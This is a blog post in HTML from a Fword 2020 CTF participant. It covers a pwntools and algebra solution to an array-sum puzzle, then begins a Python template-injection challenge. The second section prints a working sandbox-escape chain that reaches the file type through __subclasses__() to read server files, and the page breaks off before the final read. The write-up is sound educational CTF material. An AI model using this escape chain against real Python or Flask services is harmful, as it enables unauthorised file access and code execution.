<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta http-equiv="x-ua-compatible" content="ie=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><meta name="generator" content="Gatsby 4.11.2"/><link rel="sitemap" type="application/xml" href="/sitemap/sitemap-index.xml"/><style>.gatsby-image-wrapper{position:relative;overflow:hidden}.gatsby-image-wrapper picture.object-fit-polyfill{position:static!important}.gatsby-image-wrapper img{bottom:0;height:100%;left:0;margin:0;max-width:none;padding:0;position:absolute;right:0;top:0;width:100%;object-fit:cover}.gatsby-image-wrapper [data-main-image]{opacity:0;transform:translateZ(0);transition:opacity .25s linear;will-change:opacity}.gatsby-image-wrapper-constrained{display:inline-block;vertical-align:top}</style><noscript><style>.gatsby-image-wrapper noscript [data-main-image]{opacity:1!important}.gatsby-image-wrapper [data-placeholder-image]{opacity:0!important}</style></noscript><script type="module">const e="undefined"!=typeof HTMLImageElement&&"loading"in HTMLImageElement.prototype;e&&document.body.addEventListener("load",(function(e){if(void 0===e.target.dataset.mainImage)return;if(void 0===e.target.dataset.gatsbyImageSsr)return;const t=e.target;let a=null,n=t;for(;null===a&&n;)void 0!==n.parentNode.dataset.gatsbyImageWrapper&&(a=n.parentNode),n=n.parentNode;const o=a.querySelector("[data-placeholder-image]"),r=new Image;r.src=t.currentSrc,r.decode().catch((()=>{})).then((()=>{t.style.opacity=1,o&&(o.style.opacity=0,o.style.transition="opacity 500ms linear")}))}),!0);</script><link as="script" rel="preload" href="/webpack-runtime-dfbc60d330bf24dc7417.js"/><link as="script" rel="preload" href="/framework-b4c2e49b0265e11fe0b1.js"/><link as="script" rel="preload" href="/05d954cf-2e4067c921aee2b6a16a.js"/><link as="script" rel="preload" href="/app-8bf2c68a69a3d07ce713.js"/><link as="fetch" rel="preload" href="/page-data/blog/fword2020-ctf/page-data.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/2744905544.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/sq/d/3935399047.json" crossorigin="anonymous"/><link as="fetch" rel="preload" href="/page-data/app-data.json" crossorigin="anonymous"/></head><body><script>(function() { try {
  var mode = localStorage.getItem('theme-ui-color-mode');
  if (!mode) return
  document.documentElement.classList.add('theme-ui-' + mode);
} catch (e) {} })();</script><div id="___gatsby"><style data-emotion="css-global f4iio2">html{--theme-ui-colors-text:#202124;--theme-ui-colors-background:#fff;--theme-ui-colors-primary:#1a73e8;--theme-ui-colors-secondary:#9c27b0;--theme-ui-colors-muted:#767c89;color:var(--theme-ui-colors-text);background-color:var(--theme-ui-colors-background);}html.theme-ui-light,.theme-ui-light html{--theme-ui-colors-text:#202124;--theme-ui-colors-background:#fff;--theme-ui-colors-primary:#1a73e8;--theme-ui-colors-secondary:#9c27b0;--theme-ui-colors-muted:#767c89;}html.theme-ui-dark,.theme-ui-dark html{--theme-ui-colors-text:#fff;--theme-ui-colors-background:#202124;--theme-ui-colors-primary:#1a73e8;--theme-ui-colors-secondary:#9c27b0;--theme-ui-colors-muted:#a5aab4;}</style><style data-emotion="css-global 18o3y6r">*{box-sizing:border-box;}html{font-family:Roboto,system-ui,sans-serif;line-height:1.5;font-weight:400;}body{margin:0;}</style><div style="outline:none" tabindex="-1" id="gatsby-focus-wrapper"><style data-emotion="css ylz6b4">.css-ylz6b4{--theme-ui-colors-text:#202124;--theme-ui-colors-background:#fff;--theme-ui-colors-primary:#1a73e8;--theme-ui-colors-secondary:#9c27b0;--theme-ui-colors-muted:#767c89;}.css-ylz6b4.theme-ui-light,.theme-ui-light .css-ylz6b4{--theme-ui-colors-text:#202124;--theme-ui-colors-background:#fff;--theme-ui-colors-primary:#1a73e8;--theme-ui-colors-secondary:#9c27b0;--theme-ui-colors-muted:#767c89;}.css-ylz6b4.theme-ui-dark,.theme-ui-dark .css-ylz6b4{--theme-ui-colors-text:#fff;--theme-ui-colors-background:#202124;--theme-ui-colors-primary:#1a73e8;--theme-ui-colors-secondary:#9c27b0;--theme-ui-colors-muted:#a5aab4;}</style><div data-themeui-nested-provider="true" class="css-ylz6b4"><style data-emotion="css qin9tw">.css-qin9tw{box-sizing:border-box;margin:0;min-width:0;width:100%;max-width:container;margin-left:auto;margin-right:auto;max-width:1200px;width:100%;margin-left:auto;margin-right:auto;padding-left:16px;padding-right:16px;}</style><div class="css-qin9tw"><style data-emotion="css 1jf4m4z">.css-1jf4m4z{padding-left:4px;padding-right:4px;padding-top:32px;-webkit-box-pack:justify;-webkit-justify-content:space-between;justify-content:space-between;-webkit-flex-direction:row-reverse;-ms-flex-direction:row-reverse;flex-direction:row-reverse;}</style><style data-emotion="css 1517jte">.css-1517jte{box-sizing:border-box;margin:0;min-width:0;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;padding-left:4px;padding-right:4px;padding-top:32px;-webkit-box-pack:justify;-webkit-justify-content:space-between;justify-content:space-between;-webkit-flex-direction:row-reverse;-ms-flex-direction:row-reverse;flex-direction:row-reverse;}</style><header class="css-1517jte"><style data-emotion="css f5x5k7">.css-f5x5k7{height:72px;width:72px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}</style><style data-emotion="css x0mgp8-IconButton">.css-x0mgp8-IconButton{box-sizing:border-box;margin:0;min-width:0;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none;appearance:none;display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;padding:4px;width:32px;height:32px;color:inherit;background-color:transparent;border:none;border-radius:4px;height:72px;width:72px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}</style><button class="css-x0mgp8-IconButton"><style data-emotion="css 1wjgolj">.css-1wjgolj{font-size:48px;margin:0;padding-bottom:8px;}</style><style data-emotion="css otzcoq">.css-otzcoq{box-sizing:border-box;margin:0;min-width:0;font-family:Roboto,system-ui,sans-serif;font-weight:400;line-height:1.125;font-size:48px;margin:0;padding-bottom:8px;}</style><h2 class="css-otzcoq">J</h2><svg width="3em" height="3em" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" style="transform-origin:50% 50%"><circle cx="11.9998" cy="11.9998" r="5.75375" fill="currentColor" style="transform:scale(1.5);transform-origin:0px 0px"></circle><g style="transform:rotate(45deg);transform-origin:0px 0px"><circle cx="3.08982" cy="6.85502" r="1.71143" transform="rotate(-60 3.08982 6.85502)" fill="currentColor"></circle><circle cx="3.0903" cy="17.1436" r="1.71143" transform="rotate(-120 3.0903 17.1436)" fill="currentColor"></circle><circle cx="12" cy="22.2881" r="1.71143" fill="currentColor"></circle><circle cx="20.9101" cy="17.1436" r="1.71143" transform="rotate(-60 20.9101 17.1436)" fill="currentColor"></circle><circle cx="20.9101" cy="6.8555" r="1.71143" transform="rotate(-120 20.9101 6.8555)" fill="currentColor"></circle><circle cx="12" cy="1.71143" r="1.71143" fill="currentColor"></circle></g></svg></button><style data-emotion="css mznt71">.css-mznt71{height:72px;width:72px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:start;-ms-flex-pack:start;-webkit-justify-content:flex-start;justify-content:flex-start;}</style><style data-emotion="css 5oct1l-IconButton">.css-5oct1l-IconButton{box-sizing:border-box;margin:0;min-width:0;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none;appearance:none;display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;padding:4px;width:32px;height:32px;color:inherit;background-color:transparent;border:none;border-radius:4px;height:72px;width:72px;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-box-pack:start;-ms-flex-pack:start;-webkit-justify-content:flex-start;justify-content:flex-start;}</style><button class="css-5oct1l-IconButton"><svg viewBox="0 0 1000 1000" height="32x" width="32px"><path fill="var(--theme-ui-colors-text)" d="M230.5,499l496,491l43-54.8L284.9,444L230.5,499z"></path><path fill="var(--theme-ui-colors-text)" d="M286.6,554L750.9,64l-44.6-54L230.5,499.4L286.6,554z"></path></svg></button></header><style data-emotion="css wnz4ls">.css-wnz4ls{font-weight:300;margin:0;}</style><style data-emotion="css 1do2557">.css-1do2557{color:var(--theme-ui-colors-text);font-family:Roboto,system-ui,sans-serif;line-height:1.125;font-weight:400;font-size:16px;font-weight:300;margin:0;}</style><h6 class="css-1do2557">September 1st, 2020</h6><style data-emotion="css 17490uu">.css-17490uu{color:var(--theme-ui-colors-muted);margin:0;}</style><style data-emotion="css ff7xx3">.css-ff7xx3{color:var(--theme-ui-colors-text);font-family:Roboto,system-ui,sans-serif;line-height:1.125;font-weight:400;font-size:24px;color:var(--theme-ui-colors-muted);margin:0;}@media screen and (min-width: 52em){.css-ff7xx3{font-size:32px;}}</style><h4 class="css-ff7xx3"><code class="css-1avyp1d">/blog</code></h4><style data-emotion="css 1lkklub">.css-1lkklub{margin-top:0;}</style><style data-emotion="css 11iefvm">.css-11iefvm{color:var(--theme-ui-colors-text);font-family:Roboto,system-ui,sans-serif;line-height:1.125;font-weight:400;font-size:48px;margin-top:0;}@media screen and (min-width: 52em){.css-11iefvm{font-size:64px;}}</style><h2 class="css-11iefvm">Fword 2020 CTF write-up</h2><div data-gatsby-image-wrapper="" class="gatsby-image-wrapper"><div aria-hidden="true" style="padding-top:49.016522423288755%"></div><img aria-hidden="true" data-placeholder-image="" style="opacity:1;transition:opacity 500ms linear" decoding="async" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAQCAYAAAB3AH1ZAAAACXBIWXMAAAPoAAAD6AG1e1JrAAACm0lEQVRIiZ2U25LiMAxEUwW5EMi+LAMkvuay//+JvdWSHcww7MM+nJoBW1JjSV0N8x8IUbmQsOHsN/R+w8mt6OyK1ixCM82oR+VIHiTK//l73mkmvd/ZBSe7Sp7er5L3zPxhkzpVLrwLSIciwGkgk+TiTwFRCxfUZIxokojWzOiyCArYRay7iGqIGzIsfgl6ofcLekf1Czozo2XxUQvUj4Ajub/DM8K7zRQljvEnSzQnOXuyorqEBSVy4Gb0ToM6wyQB7RjQPDzqu8eR3Jxw+FLyZ8I79cOjeWgc45nnROyMnqQa1SXMEPyMM3ERveNFBgR0k0c7MhkTO9Q3i+OXcriaN+TsZlGLECdxjO/IFCSnYCN6G1FdfETmTFxAb3mBqhnEBExkUd+ZnEVYbMLh9zeuE44iwqAmN4vmbtGKCJdE+KcIEz4IcCrg9IOAuhRw/YeA2w8CWLwQ0IuA3IK9DRTB5wlvLWAyfQW2wHxogUktYPGiBdNrC/rcgiEuyOgg6izIkOQ5MBwkj2bkcGlvdeCymPR3H0KXhpDi+SOeQyiF0wBy2KthXiFEhWuYt+FlEwzXiuvFNdMpl234hp7pvZZraOK+hq8rmNbw17xhyNALkohzUC84ORqJmgoTcrdrEZG8oEA8YCw8QIxoTkaUPGA3Iq1TDf8rYPwkQO/sAmwhQAxOcxdOuOrTZ+SQlzVIW0ABKXH69foCxfMXL5BFMCaLkFxs6y5AqXYHzMglBrBvcXdC7X/qsRR1SnZA+ZxngAOrMToDMYmYk4hEWFCJ+3HqM3RBccLX6RcnlA3IE29xoBsW5O91C5zGcY3TJnXcKslPIVqv6n2EIAfJAZMLsriakBZ+dcLCjASDAz0g+wDviwiXRPgkohQS8Rfi14FP916ZKQAAAABJRU5ErkJggg==" alt=""/><picture><source type="image/webp" data-srcset="/static/cd2a3e31f144c75d2a71204f0f860d03/bcdb5/fwords_score.webp 750w,/static/cd2a3e31f144c75d2a71204f0f860d03/1be92/fwords_score.webp 1080w,/static/cd2a3e31f144c75d2a71204f0f860d03/444c7/fwords_score.webp 1271w" sizes="100vw"/><img data-gatsby-image-ssr="" data-main-image="" style="opacity:0" sizes="100vw" decoding="async" loading="lazy" data-src="/static/cd2a3e31f144c75d2a71204f0f860d03/15b05/fwords_score.png" data-srcset="/static/cd2a3e31f144c75d2a71204f0f860d03/da04c/fwords_score.png 750w,/static/cd2a3e31f144c75d2a71204f0f860d03/e5f27/fwords_score.png 1080w,/static/cd2a3e31f144c75d2a71204f0f860d03/15b05/fwords_score.png 1271w" alt="Fword 2020 CTF write-up blog image"/></picture><noscript><picture><source type="image/webp" srcSet="/static/cd2a3e31f144c75d2a71204f0f860d03/bcdb5/fwords_score.webp 750w,/static/cd2a3e31f144c75d2a71204f0f860d03/1be92/fwords_score.webp 1080w,/static/cd2a3e31f144c75d2a71204f0f860d03/444c7/fwords_score.webp 1271w" sizes="100vw"/><img data-gatsby-image-ssr="" data-main-image="" style="opacity:0" sizes="100vw" decoding="async" loading="lazy" src="/static/cd2a3e31f144c75d2a71204f0f860d03/15b05/fwords_score.png" srcSet="/static/cd2a3e31f144c75d2a71204f0f860d03/da04c/fwords_score.png 750w,/static/cd2a3e31f144c75d2a71204f0f860d03/e5f27/fwords_score.png 1080w,/static/cd2a3e31f144c75d2a71204f0f860d03/15b05/fwords_score.png 1271w" alt="Fword 2020 CTF write-up blog image"/></picture></noscript><script type="module">const t="undefined"!=typeof HTMLImageElement&&"loading"in HTMLImageElement.prototype;if(t){const t=document.querySelectorAll("img[data-main-image]");for(let e of t){e.dataset.src&&(e.setAttribute("src",e.dataset.src),e.removeAttribute("data-src")),e.dataset.srcset&&(e.setAttribute("srcset",e.dataset.srcset),e.removeAttribute("data-srcset"));const t=e.parentNode.querySelectorAll("source[data-srcset]");for(let e of t)e.setAttribute("srcset",e.dataset.srcset),e.removeAttribute("data-srcset");e.complete&&(e.style.opacity=1)}}</script></div><div data-themeui-nested-provider="true" class="css-ylz6b4"><style data-emotion="css 1oakn4d">.css-1oakn4d{color:var(--theme-ui-colors-text);font-family:Roboto,system-ui,sans-serif;line-height:1.5;font-weight:400;}</style><style data-emotion="css 1o0jogz">.css-1o0jogz{color:var(--theme-ui-colors-text);font-family:Roboto,system-ui,sans-serif;line-height:1.5;font-weight:400;color:var(--theme-ui-colors-text);font-family:Roboto,system-ui,sans-serif;line-height:1.5;font-weight:400;}</style><style data-emotion="css 1yn88va">.css-1yn88va{color:var(--theme-ui-colors-text);font-family:Roboto,system-ui,sans-serif;line-height:1.5;font-weight:400;color:var(--theme-ui-colors-text);font-family:Roboto,system-ui,sans-serif;line-height:1.5;font-weight:400;color:var(--theme-ui-colors-text);font-family:Roboto,system-ui,sans-serif;line-height:1.5;font-weight:400;}</style><p class="css-1yn88va">This was one of the first CTFs I&#x27;ve competed in, and I&#x27;m pretty happy with the performance we obtained. I worked on two problems, one which I didn&#x27;t get in the end. But it was still a great learning experience. I definitely got carried by the other people in my team, who did really well in the <code class="css-mwukus">pwn</code> section.</p><style data-emotion="css ydlsvm">.css-ydlsvm{color:var(--theme-ui-colors-text);font-family:Roboto,system-ui,sans-serif;line-height:1.125;font-weight:400;font-size:2.25rem;}</style><style data-emotion="css 19f5q4">.css-19f5q4{color:var(--theme-ui-colors-text);font-family:Roboto,system-ui,sans-serif;line-height:1.125;font-weight:400;font-size:2.25rem;color:var(--theme-ui-colors-text);font-family:Roboto,system-ui,sans-serif;line-height:1.125;font-weight:400;font-size:2.25rem;}</style><style data-emotion="css 6o8xfl">.css-6o8xfl{color:var(--theme-ui-colors-text);font-family:Roboto,system-ui,sans-serif;line-height:1.125;font-weight:400;font-size:2.25rem;color:var(--theme-ui-colors-text);font-family:Roboto,system-ui,sans-serif;line-height:1.125;font-weight:400;font-size:2.25rem;color:var(--theme-ui-colors-text);font-family:Roboto,system-ui,sans-serif;line-height:1.125;font-weight:400;font-size:2.25rem;}</style><h2 class="css-6o8xfl">Problem 1 - Secret Array</h2><p class="css-1yn88va"><style data-emotion="css 119qnnd">.css-119qnnd{font-weight:600;}</style><style data-emotion="css ymj8jc">.css-ymj8jc{font-weight:600;font-weight:600;}</style><style data-emotion="css 7xdqx3">.css-7xdqx3{font-weight:600;font-weight:600;font-weight:600;}</style><strong class="css-7xdqx3">TL;DR</strong></p><style data-emotion="css 79bu0b">.css-79bu0b{margin:1rem 0 1rem 0.9375rem;color:var(--theme-ui-colors-text);padding:0;}</style><style data-emotion="css exvrup">.css-exvrup{margin:1rem 0 1rem 0.9375rem;color:var(--theme-ui-colors-text);padding:0;margin:1rem 0 1rem 0.9375rem;color:var(--theme-ui-colors-text);padding:0;}</style><style data-emotion="css 1sqmp6c">.css-1sqmp6c{margin:1rem 0 1rem 0.9375rem;color:var(--theme-ui-colors-text);padding:0;margin:1rem 0 1rem 0.9375rem;color:var(--theme-ui-colors-text);padding:0;margin:1rem 0 1rem 0.9375rem;color:var(--theme-ui-colors-text);padding:0;}</style><ul class="css-1sqmp6c"><style data-emotion="css 1830aub">.css-1830aub{margin-bottom:0.625rem;font-size:1em;line-height:1.625em;}</style><style data-emotion="css u8ae9d">.css-u8ae9d{margin-bottom:0.625rem;font-size:1em;line-height:1.625em;margin-bottom:0.625rem;font-size:1em;line-height:1.625em;}</style><style data-emotion="css 1rk5nsg">.css-1rk5nsg{margin-bottom:0.625rem;font-size:1em;line-height:1.625em;margin-bottom:0.625rem;font-size:1em;line-height:1.625em;margin-bottom:0.625rem;font-size:1em;line-height:1.625em;}</style><li class="css-1rk5nsg">use <code class="css-mwukus">pwntools</code> to interface with the IP and port, not netcat, as there is no easy way to pipe python output to netcat</li><li class="css-1rk5nsg"><strong class="css-7xdqx3">DON&#x27;T name your file something generic like <code class="css-mwukus">pwn.py</code> or <code class="css-mwukus">numbers.py</code>, as those are internally used by <code class="css-mwukus">pwntools</code>, and will result in failures DX</strong></li><li class="css-1rk5nsg">don&#x27;t overengineer your answers, occam&#x27;s razor</li><li class="css-1rk5nsg">installation steps:</li></ul><deckgo-highlight-code language="bash">
          <code slot="code" class="css-mwukus">virtualenv venv
. venv/bin/activate
pip install pwntools</code>
        </deckgo-highlight-code><p class="css-1yn88va">The problem was hosted in a server, and netcat was used to access it.
<code class="css-mwukus">nc secretarray.fword.wtf 1337</code></p><p class="css-1yn88va">The problem stated that there were 1337 unknown numbers in an array, and we were allowed to query the server with 2 valid indices, which would return the sum of the two numbers in the array at those indices. We were allowed to query the server 1337 times.</p><p class="css-1yn88va">At first glance, I immediately felt like this would be a great opportunity to use <code class="css-mwukus">np.linalg.solve</code>, as the problem was essentially a really big simultaneous equations problem, so at first I made arbitrary guesses of the form:</p><deckgo-highlight-code language="python">
          <code slot="code" class="css-mwukus">for i in range(1337):
    if i == 1336:
        print(f&quot;0 1336&quot;)
    else:
        print(f&quot;{i} {i+1}&quot;)</code>
        </deckgo-highlight-code><p class="css-1yn88va">This yielded a list of 1337 numbers, which I turned into a numpy array. I also converted my guesses into a numpy matrix like so:</p><deckgo-highlight-code language="python">
          <code slot="code" class="css-mwukus">matrix = np.zeros((1337,1337))
for i in range(1337):

    if i == 1336:
        matrix[i,i] = 1
        matrix[i,0] = 1
    else:
        matrix[i,i] = 1
        matrix[i,i+1] = 1

matrix = matrix.astype(&#x27;float64&#x27;)
ans = np.linalg.solve(matrix, res)
for a in ans:
    print(a)</code>
        </deckgo-highlight-code><p class="css-1yn88va">However, I immediately realised this wasn&#x27;t going to work when I was getting floats as my answers...</p><p class="css-1yn88va">So instead, I decided to rethink my strategy, since the simulataneous equations were quite simple:</p><ul class="css-1sqmp6c"><li class="css-1rk5nsg">Let every element in the array be labelled like $a_{i}, i \in 1,2,...,N, \text{where } N=1337$.</li><li class="css-1rk5nsg">Thinking for a simple case, where $N=3$, we see that for the following chosen indices:</li></ul><p class="css-1yn88va">$$
\begin{cases}
a_0 + a_1 = b_0 \qquad (1)<!-- -->\<!-- -->
a_0 + a_2 = b_1 \qquad (2)<!-- -->\<!-- -->
a_1 + a_2 = b_2 \qquad (3)
\end{cases}
$$</p><ul class="css-1sqmp6c"><li class="css-1rk5nsg">We can simply solve these by computing $(1)-(2) \equiv a_1 - a_2 = b_0 - b_1$, adding this to $(3)$, we obtain</li></ul><p class="css-1yn88va">$$
\begin{cases}
a_0 = b_0 - a_1 <!-- -->\<!-- -->
a_1 = \frac{b_0 - b_1 + b_2}{2} <!-- -->\<!-- -->
a_2 = b_0 - a_2
\end{cases}
$$</p><p class="css-1yn88va">By solving this simplest case, we get a values for $a_0, a_1, a_2$ and we can easily extend this scenario to $N=4$ by taking the 4th simultaneous equation to be</p><p class="css-1yn88va">$$
\begin{aligned}
a_2 + a_3 &amp;= b_3 <!-- -->\<!-- -->
\therefore a_3 &amp;= b_3 - a_2
\end{aligned}
$$</p><p class="css-1yn88va">So I just coded this:</p><deckgo-highlight-code language="python">
          <code slot="code" class="css-mwukus">with open(&#x27;output.txt&#x27;,&#x27;r&#x27;) as f:
    data = f.readlines()

data = [int(d[:-1]) for d in data] #strip newline

# solve the first 3
answers = [0 for _ in range(1337)]

answers[1] = (data[0]-data[1]+data[2])/2
answers[0] = data[0]-answers[1]
answers[2] = data[2]-answers[1]

for i in range(3,1337):
    answers[i] = data[i]-answers[i-1]

# checking
assert(answers[0]+answers[1] == data[0])
assert(answers[0]+answers[2] == data[1])
assert(answers[1]+answers[2] == data[2])
for i in range(3,1337):
    assert(answers[i-1]+answers[i] == data[i])

print(&quot;DONE &quot;+&quot; &quot;.join(str(a) for a in answers))</code>
        </deckgo-highlight-code><p class="css-1yn88va">Now, when I was trying to get <code class="css-mwukus">pwntools</code> to work, I had made the moronically called the file <code class="css-mwukus">pwn.py</code> which was an internal file used in <code class="css-mwukus">pwntools</code>, so it failed, I eventually got my friend to run the code above and he got the flag :S.</p><h2 class="css-6o8xfl">Problem 2 - Directory Manager</h2><p class="css-1yn88va">This one was really hard and involved a Server Side Template Injection in python. I didn&#x27;t get it this time, but here are some things I found out that might prove useful in later CTFs.</p><style data-emotion="css 1kbxfpo">.css-1kbxfpo{color:var(--theme-ui-colors-text);font-family:Roboto,system-ui,sans-serif;line-height:1.125;font-weight:400;font-size:1.5rem;}</style><style data-emotion="css axogex">.css-axogex{color:var(--theme-ui-colors-text);font-family:Roboto,system-ui,sans-serif;line-height:1.125;font-weight:400;font-size:1.5rem;color:var(--theme-ui-colors-text);font-family:Roboto,system-ui,sans-serif;line-height:1.125;font-weight:400;font-size:1.5rem;}</style><style data-emotion="css 4hwfb">.css-4hwfb{color:var(--theme-ui-colors-text);font-family:Roboto,system-ui,sans-serif;line-height:1.125;font-weight:400;font-size:1.5rem;color:var(--theme-ui-colors-text);font-family:Roboto,system-ui,sans-serif;line-height:1.125;font-weight:400;font-size:1.5rem;color:var(--theme-ui-colors-text);font-family:Roboto,system-ui,sans-serif;line-height:1.125;font-weight:400;font-size:1.5rem;}</style><h3 class="css-4hwfb">Recon</h3><p class="css-1yn88va">I just kept trying different inputs, here are some examples of what I got</p><deckgo-highlight-code>
          <code slot="code" class="css-mwukus">xpirep@kali:~/dev/fword20/dir$ nc directorymanager.fword.wtf 1234
Welcome to our Directory Manager, what do you want to execute :
dir
&lt;built-in function dir&gt;</code>
        </deckgo-highlight-code><p class="css-1yn88va">Some more examples include:</p><deckgo-highlight-code>
          <code slot="code" class="css-mwukus">dir: &lt;built-in function dir&gt;
file: &lt;type &#x27;file&#x27;&gt;
exit: Use exit() or Ctrl-D (i.e. EOF) to exit
anything where the second letter is an s: Thank you !
[]: []
[&#x27;hello&#x27;]: []
[&#x27;qwertyuiopadfghjklzxcvbnm,./;[]\-=1234567890!@#$%^&amp;*()_+{}|:&quot;&lt;&gt;?&#x27;]: [&#x27;qwertyuiopadfghjklzxcvbnm,./;[]\-=1234567890!@#$%^&amp;*()_+{}|:&quot;&lt;&gt;?&#x27;]</code>
        </deckgo-highlight-code><p class="css-1yn88va">Ultimately, from the output interpretations of <code class="css-mwukus">dir</code> and <code class="css-mwukus">file</code>, I was pretty sure python code was executing. However, interestingly any input that contained the letter &#x27;s&#x27; would fail with <code class="css-mwukus">Thank you !</code>.</p><h3 class="css-4hwfb">Intro to SSTI</h3><p class="css-1yn88va">In a previous challenge, I performed Server Side Template Injection (SSTI) and remote code execution (RCE) through a Flask template input by exploiting the fact that <code class="css-mwukus">file</code> is a built in type, and that there were certain builtin class functions that let you go from any one class to any other class.</p><deckgo-highlight-code language="python">
          <code slot="code" class="css-mwukus">&gt;&gt;&gt; [].__class__
&lt;type &#x27;list&#x27;&gt;</code>
        </deckgo-highlight-code><p class="css-1yn88va">Here, we can abuse the <code class="css-mwukus">.__class__</code> method to obtain a reference to the list object type.</p><deckgo-highlight-code language="python">
          <code slot="code" class="css-mwukus">&gt;&gt;&gt; [].__class__.__base__
&lt;type &#x27;object&#x27;&gt;</code>
        </deckgo-highlight-code><p class="css-1yn88va">We can go further and obtain the object class like so.</p><deckgo-highlight-code language="python">
          <code slot="code" class="css-mwukus">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()
[&lt;type &#x27;type&#x27;&gt;, &lt;type &#x27;weakref&#x27;&gt;, &lt;type &#x27;weakcallableproxy&#x27;&gt;, &lt;type &#x27;weakproxy&#x27;&gt;, &lt;type &#x27;int&#x27;&gt;, &lt;type &#x27;basestring&#x27;&gt;, &lt;type &#x27;bytearray&#x27;&gt;, &lt;type &#x27;list&#x27;&gt;, &lt;type &#x27;NoneType&#x27;&gt;, &lt;type &#x27;NotImplementedType&#x27;&gt;, &lt;type &#x27;traceback&#x27;&gt;, &lt;type &#x27;super&#x27;&gt;, &lt;type &#x27;xrange&#x27;&gt;, &lt;type &#x27;dict&#x27;&gt;, &lt;type &#x27;set&#x27;&gt;, &lt;type &#x27;slice&#x27;&gt;, &lt;type &#x27;staticmethod&#x27;&gt;, &lt;type &#x27;complex&#x27;&gt;, &lt;type &#x27;float&#x27;&gt;, &lt;type &#x27;buffer&#x27;&gt;, &lt;type &#x27;long&#x27;&gt;, &lt;type &#x27;frozenset&#x27;&gt;, &lt;type &#x27;property&#x27;&gt;, &lt;type &#x27;memoryview&#x27;&gt;, &lt;type &#x27;tuple&#x27;&gt;, &lt;type &#x27;enumerate&#x27;&gt;, &lt;type &#x27;reversed&#x27;&gt;, &lt;type &#x27;code&#x27;&gt;, &lt;type &#x27;frame&#x27;&gt;, &lt;type &#x27;builtin_function_or_method&#x27;&gt;, &lt;type &#x27;instancemethod&#x27;&gt;, &lt;type &#x27;function&#x27;&gt;, &lt;type &#x27;classobj&#x27;&gt;, &lt;type &#x27;dictproxy&#x27;&gt;, &lt;type &#x27;generator&#x27;&gt;, &lt;type &#x27;getset_descriptor&#x27;&gt;, &lt;type &#x27;wrapper_descriptor&#x27;&gt;, &lt;type &#x27;instance&#x27;&gt;, &lt;type &#x27;ellipsis&#x27;&gt;, &lt;type &#x27;member_descriptor&#x27;&gt;, &lt;type &#x27;file&#x27;&gt;, &lt;type &#x27;PyCapsule&#x27;&gt;, &lt;type &#x27;cell&#x27;&gt;, &lt;type &#x27;callable-iterator&#x27;&gt;, &lt;type &#x27;iterator&#x27;&gt;, &lt;type &#x27;sys.long_info&#x27;&gt;, &lt;type &#x27;sys.float_info&#x27;&gt;, &lt;type &#x27;EncodingMap&#x27;&gt;, &lt;type &#x27;fieldnameiterator&#x27;&gt;, &lt;type &#x27;formatteriterator&#x27;&gt;, &lt;type &#x27;sys.version_info&#x27;&gt;, &lt;type &#x27;sys.flags&#x27;&gt;, &lt;type &#x27;exceptions.BaseException&#x27;&gt;, &lt;type &#x27;module&#x27;&gt;, &lt;type &#x27;imp.NullImporter&#x27;&gt;, &lt;type &#x27;zipimport.zipimporter&#x27;&gt;, &lt;type &#x27;posix.stat_result&#x27;&gt;, &lt;type &#x27;posix.statvfs_result&#x27;&gt;, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &lt;class &#x27;_abcoll.Hashable&#x27;&gt;, &lt;type &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_abcoll.Iterable&#x27;&gt;, &lt;class &#x27;_abcoll.Sized&#x27;&gt;, &lt;class &#x27;_abcoll.Container&#x27;&gt;, &lt;class &#x27;_abcoll.Callable&#x27;&gt;, &lt;type &#x27;dict_keys&#x27;&gt;, &lt;type &#x27;dict_items&#x27;&gt;, &lt;type &#x27;dict_values&#x27;&gt;, &lt;class &#x27;site._Printer&#x27;&gt;, &lt;class &#x27;site._Helper&#x27;&gt;, &lt;type &#x27;_sre.SRE_Pattern&#x27;&gt;, &lt;type &#x27;_sre.SRE_Match&#x27;&gt;, &lt;type &#x27;_sre.SRE_Scanner&#x27;&gt;, &lt;class &#x27;site.Quitter&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;]</code>
        </deckgo-highlight-code><p class="css-1yn88va">We can actually find the <code class="css-mwukus">file</code> type, by taking the 40th element in this list:</p><deckgo-highlight-code language="python">
          <code slot="code" class="css-mwukus">&gt;&gt;&gt; [].__class__.__base__.__subclasses__()[40]
&lt;type &#x27;file&#x27;&gt;</code>
        </deckgo-highlight-code><p class="css-1yn88va">And finally, we can use this type as a function to read and print a file.</p><deckgo-highlight-code language="python">
